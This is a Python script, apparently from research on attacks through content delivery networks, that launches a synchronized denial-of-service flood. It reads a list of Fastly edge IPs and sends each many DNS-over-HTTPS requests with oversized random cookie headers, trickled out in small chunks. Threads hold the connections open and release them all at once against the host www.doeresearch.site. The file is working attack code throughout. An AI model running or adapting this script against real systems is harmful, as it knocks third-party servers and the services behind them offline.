import argparse
import http.client
import asyncio
import base64
import random
import secrets
import string
from collections import Counter
import sys
import time
import requests
import dns.message
import httpx
import gzip
import io
import pandas as pd
import tqdm
from concurrent.futures import ThreadPoolExecutor
import threading
from dns.message import make_query

def ge_cookie():
    cookie = ""
    for i in range(200):
        cookie += ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(4, 10)))+\
                  "="''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(8, 20)))+"; "
    cookie = cookie[:-2]
    #print(sys.getsizeof(cookie)/1024)
    return cookie

def send_request(event,url,t,latency,stime):
    cookie = ge_cookie()
    headers = {"content-type": "application/dns-message",
               "accept": "application/dns-message",
               "Surrogate-Control": "max-age=0", "Cache-Control": "max-age=0",
               "Cookie":cookie}
    message = dns.message.make_query(base64.b64encode(url.encode("utf-8")).decode("utf-8") +
                                     ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))+ ".google.com", "A")
    message.flags |= dns.flags.RD
    dns_req = base64.b64encode(message.to_wire()).decode("UTF8").rstrip("=")
    # time.sleep(t*2)
    conn = http.client.HTTPConnection(url, port=80)


    #time.sleep(3)
    body = ','.join([f'{name}: {value}' for name, value in headers.items()])
    request_line = "GET /dns-query?dns=" + f"{dns_req} HTTP/1.1\r\n"
    conn.send(request_line.encode())
    headers0 = {'host': 'www.doeresearch.site'}
    headers0 = ''.join([f'{name}: {value}\r\n' for name, value in headers0.items()])
    conn.send(headers0.encode())

    #time.sleep(10)
    #body = str(make_query(qname="baidu.com", rdtype="A", want_dnssec=False))
    #print(body)
    #print(len(body))
    chunk_size = 20 # 每个块的大小
    for i in range(0, len(body), chunk_size):
        #print(i,'------------------')
        chunk = body[i:i + chunk_size]
        conn.send(f'{chunk}'.encode())
        start_time = time.perf_counter()
        while time.perf_counter() - start_time < 0.002:
            pass
        # print('P')
    conn.send(b'\r\n')
    # 发送结束标志
    #print(url, t, 'pending')
    desired_time = latency / 2000  # 将毫秒转换为秒
    #conn.close()
    #time.sleep(10)
    event.wait()
    # start_time = time.perf_counter()
    # while time.perf_counter() - start_time < desired_time:
    #     pass
    #conn.send(b'0\r\n\r\n')
    conn.send(b'\r\n')
    # Get the response
    #response = conn.getresponse()
    # print(response.status, response.reason)
    #print(response.read())
    # print(dns.message.from_wire(response.read()))

    #conn.close()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-stime', '--stime')
    parser.add_argument('-round', '--round',default=10)
    parser.add_argument('-wait', '--wait',default=180)
    args = parser.parse_args()


    path = '/root/Nora/cdn/'
    #path = 'D:\Volumes\调研\项目\YYDNS\GJ\DDOS/'
    df = pd.read_csv(path+'fastly_att.csv',nrows=64)
    data = df.set_index('ip')['latency'].to_dict()
    event = threading.Event()
    s_time = time.time()
    #stime = time.perf_counter()
    stime = float(args.stime)
    round = int(args.round)
    wait_time = int(args.wait)
    threads = []
    for i in range(round):
        for ip, latency in data.items():
            t = threading.Thread(target=send_request, args=(event,ip, i, latency,stime))
            t.start()
            threads.append(t)
            #time.sleep(latency)
        start_time = time.perf_counter()
        # while time.perf_counter() - start_time < 0.1:
        #     pass
    print('all waiting')
    while time.perf_counter() - stime < wait_time:
        pass
    # 触发事件，同时释放所有线程
    event.set()
    # 等待所有线程完成
    for t in threads:
        t.join()
    print('ATT over:',time.time() - s_time)
    #for i in tqdm.tqdm(range(1000)):
    #send_request("151.101.76.204",0,0,0)



